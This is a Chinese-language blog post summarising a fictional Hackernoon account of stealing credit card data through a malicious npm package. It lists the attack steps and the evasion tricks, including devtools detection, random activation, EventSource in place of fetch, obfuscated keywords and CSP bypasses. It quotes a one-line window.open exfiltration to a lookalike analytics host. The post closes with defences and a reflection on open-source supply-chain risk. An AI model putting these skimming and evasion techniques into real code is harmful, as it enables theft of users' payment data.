<!DOCTYPE html>
<html lang="zh-CN">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <link rel="shortcut icon" href="/img/favicon.ico">
  <link rel="stylesheet" href="/css/normalize.css">
  <link rel="stylesheet" href="/css/Torpedo.css">
  <link rel="stylesheet" href="/css/yewmint.css">
  <title>如何通过npm获取信用卡密码 | Yewth</title>
</head>

  <body>
    <div id="wrapper">
      <header id="page-header">
  <div id="header-title">
    <a href="/">Yewth</a>
  </div>
  <div id="header-nav">
    <ul>
      
        <li><a target="_blank" class="menu-item " href="/">Index</a></li>
      
        <li><a target="_blank" class="menu-item " href="https://github.com/yewmint">GITHUB</a></li>
      
    </ul>
</header>

      <article class="article">
  <h1 id="-" class="article-title">如何通过npm获取信用卡密码</h1>
  <p class="article-date">2018-01-20</p>
  <p>Hackernoon上有一个<a href="https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5" target="_blank" rel="external">黑客</a>描写自己如何利用带病毒的npm包，获取大量用户的隐私信息的经历。</p>
<a id="more"></a>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>写一段恶意代码，获取所有form信息，并且发送到自己服务器</li>
<li>写一个简单的npm包，比如log格式化，其中塞入自己的恶意代码</li>
<li>对大量的项目投PR，修复BUG的同时，引入自己的包</li>
</ol>
<h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><p>仅仅引入恶意代码，是无法避免被安全人员查到。作者David用了相当多的奇技淫巧来绕过安全人员检查。文章最精彩的部分就在这里。</p>
<ol>
<li>dev tools打开时暂停活动</li>
<li>白天不活动</li>
<li>对于同一个用户，永不重复活动</li>
<li>1/7概率活动，即使清除cookies也难以重现</li>
<li>url和广告链接相似</li>
<li>传到npm和github上的代码不同</li>
<li>源码中<code>package.min.js</code>并不是由<code>package.js</code>导出</li>
<li>不包含任何敏感单词，如同<code>fetch</code>，利用字符位移等技术规避</li>
<li>使用<code>EventSource</code>代替<code>fetch</code>，防止fetch被监听</li>
<li>先测试是否有办法绕过CSP，再发送</li>
<li>修改form的action绕过CSP</li>
</ol>
<p>评论里面有更狠的：</p>
<blockquote>
<p>Any way to prevent outgoing connections through<br><code>window.open(&#39;https://legit-analytics.com?q=${payload}&#39;, &#39;_blank&#39;).close()</code><br>with CSP?</p>
</blockquote>
<h2 id="避免漏洞"><a href="#避免漏洞" class="headerlink" title="避免漏洞"></a>避免漏洞</h2><p>David也“仁慈”地给出了建议，如何规避自己的恶意代码。</p>
<ol>
<li>敏感页面不要使用任何外部代码，特别是第三方广告</li>
<li>使用iframe将敏感信息与其他部分隔离</li>
</ol>
<h2 id="黑客式的嘲讽"><a href="#黑客式的嘲讽" class="headerlink" title="黑客式的嘲讽"></a>黑客式的嘲讽</h2><p>最搞笑的是，David给所有被黑过的网站一个机会，如果能防住他的攻击，就不会公布这些网站的名字。</p>
<blockquote>
<p>I will soon be posting my annual report for 2017 where I declare my income from stealing credit card numbers and selling them to gangsters in cool hats. I am required by law to show which websites I skimmed the most credit cards from — maybe yours is on the list?</p>
<p>Since I’m a classy guy, anyone on the list who has successfully blocked me from harvesting their data by January 12th will be spared the public shaming.</p>
</blockquote>
<h2 id="开源？"><a href="#开源？" class="headerlink" title="开源？"></a>开源？</h2><p>当然，这些都是虚构的。虽然一切都不是真的，但是看完依然一头冷汗，对不对？</p>
<p>开源的特性决定了，源码可以被所有人审查。但是为什么还会出现这种威胁呢？实际上，开源带来的安全感是一种虚无的东西，你习惯性地以为它在那里，实际上却是幻觉。开源运动促进了代码重用，工程师可以引入第三方包，避免了重复造轮子。但是引入好处的同时，必然带来麻烦。第三方包太多太杂，不会有人帮你检查每行代码的安全性。就算是著名的第三方库，也不能保证它们自己没有依赖奇奇怪怪的包。</p>
<p>计算机的世界没有银弹。</p>

</article>

      <footer>
  <div class="footer">
    &copy; 2015-2016 Yewmint, All rights reserved.
  </div>
</footer>

    </div>
  </body>
</html>
